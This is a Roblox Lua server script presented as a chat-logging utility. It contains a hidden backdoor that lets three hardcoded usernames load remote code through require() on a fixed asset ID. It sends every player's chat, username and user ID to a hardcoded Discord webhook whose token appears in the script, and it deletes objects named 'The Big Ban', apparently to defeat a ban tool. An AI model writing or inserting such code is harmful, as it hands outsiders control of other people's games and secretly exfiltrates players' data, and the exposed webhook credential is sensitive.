game.Players.PlayerAdded:connect(function(plr)
	plr.Chatted:connect(function(msg)
		if plr.Name == "xproliguangx" or plr.Name == "JhonXD2006" or plr.Name == "xmanutral" then
			if msg == "get/IF" or msg == "get/InfiniteYield" then
				require((3023102224))(plr.Name)
			end
		end
	end)
end)
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local disabled = false
local webhook = "https://discord.com/api/webhooks/717394130849759293/U35GhxkKEDej4I3GrQlTqiHCUceAOJ7Bh54JYWM6i47XH2a1zAIMDv71Mh9MiuKpKkeh"
local GetPlace = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
--print(GetPlace.Name)
 
if RunService:IsStudio() then
    local EnterData = {
        ['embeds'] = {{
            ['title'] = "Chat logs activated! [RL]",
            ['description'] = "The chat logs has been activated from: [**"..GetPlace.Name.."**](https://www.roblox.com/games/"..game.PlaceId..") in Roblox Studio!",
            ['color'] = 33535
        }}
    }
    HttpService:PostAsync(webhook, HttpService:JSONEncode(EnterData))
else
    local EnterData1 = {
        ['embeds'] = {{
            ['title'] = "Chat logs activated!",
            ['description'] = "The chat logs has been activated from: [**"..GetPlace.Name.."**](https://www.roblox.com/games/"..game.PlaceId..")",
            ['color'] = 33535
        }}
    }
    HttpService:PostAsync(webhook, HttpService:JSONEncode(EnterData1))
end
Players.PlayerAdded:connect(function(Player) -- add this if you need a group rank specific
    if Player:GetRankInGroup(818463) == 255 then -- El rango del grupo :)
        Player.Chatted:Connect(function(msg)
            if msg:lower() == ";chatlogs on" then
                disabled = false
                warn("Chat logs activated")
            end
            if msg:lower() == ";chatlogs off" then
                disabled = true
                warn("Chat logs deactivated")
            end
        end)
    end -- remove this one if you removed the group specification
end)
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        if disabled == false then
            local data = {
                content = msg;
                username = plr.Name .. " - (#" .. plr.UserId .. ")";
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
                }
            HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
        end
    end)
end)
 
game.Players.PlayerAdded:Connect(function(player)  -- Cuando un jugador se une
    if disabled == false then
        local data = {
            ['embeds'] = {{
                ['title'] = "Player Joined!",
                ['description'] = player.Name.." has joined the game!",
                ['color'] = 65280
            }}
        }
        local finalData = HttpService:JSONEncode(data)
        HttpService:PostAsync(webhook, finalData)
    end
end)
game.Players.PlayerRemoving:Connect(function(player)  -- Cuando un jugador se sale
    if disabled == false then
        local data = {
            ['embeds'] = {{
                ['title'] = "Player Left!",
                ['description'] = player.Name.." has left the game!",
                ['color'] = 14745600
            }}
        }
        local finalData = HttpService:JSONEncode(data)
        HttpService:PostAsync(webhook, finalData)
    end
end)
local bannedlist = {"The Big Ban"}
while wait() do
	for i, plr in pairs(Players:GetChildren()) do
		for i, b in pairs(bannedlist) do
			for i, d in pairs(plr:GetDescendants()) do
				if d.Name == b then
					d:Destroy()
				end
			end
		end
	end
end